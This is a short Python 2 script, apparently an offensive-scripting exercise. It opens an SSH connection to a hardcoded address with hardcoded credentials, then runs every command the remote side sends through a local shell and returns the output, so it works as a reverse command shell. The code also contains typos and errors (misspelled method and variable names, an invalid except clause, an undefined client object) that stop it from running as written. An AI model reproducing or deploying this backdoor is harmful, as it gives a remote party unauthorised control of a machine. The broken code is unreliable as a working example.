#!/usr/bin/env python
import paramiko
import subprocess

def ssh_command(ip,user,passwd,command):
    sshclient = paramiko.SSHClient()
    sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    sshclient.connect(ip,username=user,password=passwd)
    sshsession = sshclient.get_trasport().open_session()
    if sshsession.active:
        sshsession.send(command)
        print sshsession.recv(1024)
        while True:
            command = sshsession.recv(1024)
            try:
                cmd_output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
                sshsession.send(cmd_ouput)
            except e:
                sshsession.send(str(e))

        sessionclient.close()
        return 


ssh_command("192.168.1.106",'terry','123456','ClientConnected')

